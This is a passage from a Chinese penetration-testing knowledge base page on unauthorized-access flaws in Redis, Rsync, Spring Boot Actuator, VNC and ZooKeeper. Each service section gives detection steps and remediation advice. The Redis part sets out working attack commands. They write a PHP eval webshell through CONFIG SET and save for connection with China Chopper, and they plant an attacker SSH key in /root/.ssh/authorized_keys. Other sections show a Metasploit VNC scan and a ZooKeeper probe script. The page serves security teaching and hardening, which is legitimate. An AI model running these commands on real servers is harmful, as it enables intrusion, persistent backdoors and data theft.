<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">set webshell &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]); ?&gt;&quot;</span><br></span></code></pre></div></div>
<p>⑤ 保存</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">save</span><br></span></code></pre></div></div>
<p>⑥ 保存后用菜刀连接此木马得到 webshell。</p>
<p>(2) 结合 SSH 免密码登录</p>
<p>① 先在本地建个 ssh 的密钥</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh-keygen-trsa</span><br></span></code></pre></div></div>
<p>② 将公钥的内容写到一个文本中命令如下</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt</span><br></span></code></pre></div></div>
<p>注意写到文件中时一定要在前面加几行后面加几行。</p>
<p>③ 将里面的内容写入远程的 Redis 服务器上并且设置其 Key 为 test命令如下</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat test.txt | redis -cli -h &lt;hostname&gt; -x set test</span><br></span></code></pre></div></div>
<p>④ 登录远程服务器可以看到公钥已经添加到 Redis 的服务器上了命令如下</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">redis-cli -h &lt;hostname&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">keys *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">get test</span><br></span></code></pre></div></div>
<p>⑤ 随后就是最关键的了Redis 有个 save 命令save 命令执行一个同步保存操作将当前 Redis 实例的所有数据快照snapshot以 RDB 文件的形式保存到硬盘。所以save 命令就可以将 test 里的公钥保存到 /root/.ssh 下要有权限。</p>
<p>修改保存的路径为</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">config set dir &quot;/root/.ssh&quot;</span><br></span></code></pre></div></div>
<p>修改文件名为</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">config set dbfilename &quot;authorized_keys&quot;</span><br></span></code></pre></div></div>
<p>保存。</p>
<p>⑥ 测试一下</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh 用户名@&lt;IP地址&gt;</span><br></span></code></pre></div></div>
<p>实现免密码成功登陆。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修复方法-3">修复方法<a href="#修复方法-3" class="hash-link" aria-label="修复方法的直接链接" title="修复方法的直接链接">​</a></h3>
<p>(1) 设置 Redis 访问密码在 redis.conf 中找到 “requirepass” 字段在后面填上强口令redis 客户端也需要此密码来访问 redis 服务。</p>
<p>(2) 配置 bind 选项限定可以连接 Reids 服务器的 IP并修改默认端口 6379。</p>
<p>(3) 重启 Redis 服务。</p>
<p>(4) 清理系统中存在的后门木马。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rsync">Rsync<a href="#rsync" class="hash-link" aria-label="Rsync的直接链接" title="Rsync的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞信息-5">漏洞信息<a href="#漏洞信息-5" class="hash-link" aria-label="漏洞信息的直接链接" title="漏洞信息的直接链接">​</a></h3>
<p>(1) 漏洞简述：Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 <strong>837</strong>。</p>
<p>(2) 风险等级：高风险。</p>
<p>(3) 漏洞编号：无。</p>
<p>(4) 影响范围：Rsync 全版本。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="检测方法-4">检测方法<a href="#检测方法-4" class="hash-link" aria-label="检测方法的直接链接" title="检测方法的直接链接">​</a></h3>
<p>nmap 扫描：<code>nmap ip -p837</code>。</p>
<p>列出当前目录，显示用户：<code>rsync ip</code>。</p>
<p>如果是root，可以下载任意文件并上传文件。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修复方法-4">修复方法<a href="#修复方法-4" class="hash-link" aria-label="修复方法的直接链接" title="修复方法的直接链接">​</a></h3>
<p>(1) 隐藏 module 信息：修改配置文件 list =false。</p>
<p>(2) 权限控制：不需要写入权限的 module 的设置为只读 Read only = true。</p>
<p>(3) 网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问：hosts allow = 123.123.123.123。</p>
<p>(4) 账户认证：只允许指定的用户利用指定的密码使用 rsync 服务。</p>
<p>(5) 数据加密传输：Rsync 默认没有直接支持加密传输，如果需要 Rsync 同步重要性很高的数据，可以使用 ssh。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="springboot">SpringBoot<a href="#springboot" class="hash-link" aria-label="SpringBoot的直接链接" title="SpringBoot的直接链接">​</a></h2>
<ul>
<li>端口：80、8080、6080等web端口</li>
<li>介绍：SpringBoot，web中env路径配置文件未授权访问，可能暴露大量联动设备密码信息，甚至RCE</li>
<li>使用工具：<!-- -->
<ul>
<li>浏览器直接访问</li>
<li><a href="https://github.com/rabbitmask/SB-Actuator" target="_blank" rel="noopener noreferrer">https://github.com/rabbitmask/SB-Actuator</a></li>
</ul>
</li>
<li>修复：参考 <a href="https://www.freebuf.com/column/234719.html" target="_blank" rel="noopener noreferrer">Spring Boot Actuator从未授权访问到getshell</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="vnc">VNC<a href="#vnc" class="hash-link" aria-label="VNC的直接链接" title="VNC的直接链接">​</a></h2>
<ul>
<li>端口：5900-5905</li>
<li>介绍：vnc用于远程桌面控制，未授权访问会导致恶意用户直接控制受控主机</li>
<li>使用工具：<code>VNCview</code></li>
<li>修复：配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞信息-6">漏洞信息<a href="#漏洞信息-6" class="hash-link" aria-label="漏洞信息的直接链接" title="漏洞信息的直接链接">​</a></h3>
<p>(1) 漏洞简述VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 <strong>5900</strong>、<strong>5901</strong>。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重。</p>
<p>(2) 风险等级高风险。</p>
<p>(3) 漏洞编号无。</p>
<p>(4) 影响范围VNC 全版本。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="检测方法-5">检测方法<a href="#检测方法-5" class="hash-link" aria-label="检测方法的直接链接" title="检测方法的直接链接">​</a></h3>
<p>使用 metasploit 进行批量检测</p>
<p>(1) 在 kali 下运行 msfconsolemsfconsole。</p>
<p>(2) 调用 VNC 未授权检测模块use auxiliary/scanner/vnc/vnx_none_auth。</p>
<p>(3) 显示有哪些选项show options。</p>
<p>(4) 设置地址段set rhosts ip 或 段。</p>
<p>(5) 设置线程set threads 50。</p>
<p>(6) 开始扫描run。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修复方法-5">修复方法<a href="#修复方法-5" class="hash-link" aria-label="修复方法的直接链接" title="修复方法的直接链接">​</a></h3>
<p>(1) 配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码。</p>
<p>(2) 以最小权限的普通用户身份运行操作系统。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="zookeeper">ZooKeeper<a href="#zookeeper" class="hash-link" aria-label="ZooKeeper的直接链接" title="ZooKeeper的直接链接">​</a></h2>
<ul>
<li>
<p>端口：2181、2182</p>
</li>
<li>
<p>介绍：可读取敏感信息，或者在Zookeeper集群内执行kill命令</p>
</li>
<li>
<p>使用工具：<code>netcat</code></p>
</li>
<li>
<p>修复：</p>
<ul>
<li>1、修改 ZooKeeper 默认端口，采用其他端口服务。</li>
<li>2、添加访问控制，配置服务来源地址限制策略。</li>
<li>3、增加 ZooKeeper 的认证配置。</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞信息-7">漏洞信息<a href="#漏洞信息-7" class="hash-link" aria-label="漏洞信息的直接链接" title="漏洞信息的直接链接">​</a></h3>
<p>(1) 漏洞简述ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务是 Google 的 Chubby 一个开源的实现是 Hadoop 和 Hbase 的重要组件。它是一个为分布式应用提供一致性服务的软件提供的功能包括配置维护、域名服务、分布式同步、组服务等。ZooKeeper 默认开启在 **2181 **端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境。这将导致任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。</p>
<p>(2) 风险等级高风险。</p>
<p>(3) 漏洞编号无。</p>
<p>(4) 影响范围Zookeeper 全版本。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="检测方法-6">检测方法<a href="#检测方法-6" class="hash-link" aria-label="检测方法的直接链接" title="检测方法的直接链接">​</a></h3>
<p>(1) 通过 nmap 扫描开放了 2181 端口的主机。</p>
<p>(2) 运行脚本通过 socket 连接 2181 端口并发送 envi 命令若服务端返回的数据中包含 ZooKeeper 的服务运行环境信息即可证明存在未授权访问。</p>
<p>检测脚本</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># coding=utf-8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import socket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import sys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def check(ip, port, timeout, cmd):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    try:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        socket.setdefaulttimeout(timeout)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        s.connect((ip, int(port)))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        s.send(cmd)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data = s.recv(1024)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        s.close()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    except:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        pass</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def main():</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if len(sys.argv) &lt; 3:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exit()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ip = sys.argv[1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmd = sys.argv[2]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    # envi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    # dump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    # reqs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    # ruok</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    # stat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    check(ip, 2181, 3, cmd)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if __name__ == &#x27;__main__&#x27;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    main()</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修复方法-6">修复方法<a href="#修复方法-6" class="hash-link" aria-label="修复方法的直接链接" title="修复方法的直接链接">​</a></h3>
<p>(1) 修改 ZooKeeper 默认端口，采用其他端口服务，配置服务来源地址限制策略。</p>
<p>(2) 增加 ZooKeeper 的认证配置。</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-01T13:27:30.000Z" itemprop="dateModified">2025年6月1日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/category/未授权访问"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">未授权访问</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/渗透测试/WEB漏洞/未授权访问/Redis未授权访问漏洞利用"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Redis未授权访问漏洞利用</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#什么是未授权访问漏洞" class="table-of-contents__link toc-highlight">什么是未授权访问漏洞</a></li><li><a href="#couchdb" class="table-of-contents__link toc-highlight">CouchDB</a></li><li><a href="#docker" class="table-of-contents__link toc-highlight">Docker</a><ul><li><a href="#漏洞信息" class="table-of-contents__link toc-highlight">漏洞信息</a></li><li><a href="#检测方法" class="table-of-contents__link toc-highlight">检测方法</a></li><li><a href="#修复方法" class="table-of-contents__link toc-highlight">修复方法</a></li></ul></li><li><a href="#elasticsearch" class="table-of-contents__link toc-highlight">Elasticsearch</a></li><li><a href="#hadoop" class="table-of-contents__link toc-highlight">Hadoop</a></li><li><a href="#jenkins" class="table-of-contents__link toc-highlight">Jenkins</a></li><li><a href="#jboss" class="table-of-contents__link toc-highlight">JBOSS</a><ul><li><a href="#漏洞信息-1" class="table-of-contents__link toc-highlight">漏洞信息</a></li><li><a href="#检测方法-1" class="table-of-contents__link toc-highlight">检测方法</a></li><li><a href="#修复方法-1" class="table-of-contents__link toc-highlight">修复方法</a></li></ul></li><li><a href="#memcached" class="table-of-contents__link toc-highlight">Memcached</a><ul><li><a href="#漏洞信息-2" class="table-of-contents__link toc-highlight">漏洞信息</a></li><li><a href="#检测方法-2" class="table-of-contents__link toc-highlight">检测方法</a></li></ul></li><li><a href="#mongodb" class="table-of-contents__link toc-highlight">MongoDB</a><ul><li><a href="#漏洞信息-3" class="table-of-contents__link toc-highlight">漏洞信息</a></li><li><a href="#检测方法-3" class="table-of-contents__link toc-highlight">检测方法</a></li><li><a href="#修复方法-2" class="table-of-contents__link toc-highlight">修复方法</a></li></ul></li><li><a href="#mysql" class="table-of-contents__link toc-highlight">Mysql</a></li><li><a href="#nfs" class="table-of-contents__link toc-highlight">nfs</a></li><li><a href="#redis" class="table-of-contents__link toc-highlight">Redis</a><ul><li><a href="#漏洞信息-4" class="table-of-contents__link toc-highlight">漏洞信息</a></li><li><a href="#修复方法-3" class="table-of-contents__link toc-highlight">修复方法</a></li></ul></li><li><a href="#rsync" class="table-of-contents__link toc-highlight">Rsync</a><ul><li><a href="#漏洞信息-5" class="table-of-contents__link toc-highlight">漏洞信息</a></li><li><a href="#检测方法-4" class="table-of-contents__link toc-highlight">检测方法</a></li><li><a href="#修复方法-4" class="table-of-contents__link toc-highlight">修复方法</a></li></ul></li><li><a href="#springboot" class="table-of-contents__link toc-highlight">SpringBoot</a></li><li><a href="#vnc" class="table-of-contents__link toc-highlight">VNC</a><ul><li><a href="#漏洞信息-6" class="table-of-contents__link toc-highlight">漏洞信息</a></li><li><a href="#检测方法-5" class="table-of-contents__link toc-highlight">检测方法</a></li><li><a href="#修复方法-5" class="table-of-contents__link toc-highlight">修复方法</a></li></ul></li><li><a href="#zookeeper" class="table-of-contents__link toc-highlight">ZooKeeper</a><ul><li><a href="#漏洞信息-7" class="table-of-contents__link toc-highlight">漏洞信息</a></li><li><a href="#检测方法-6" class="table-of-contents__link toc-highlight">检测方法</a></li><li><a href="#修复方法-6" class="table-of-contents__link toc-highlight">修复方法</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>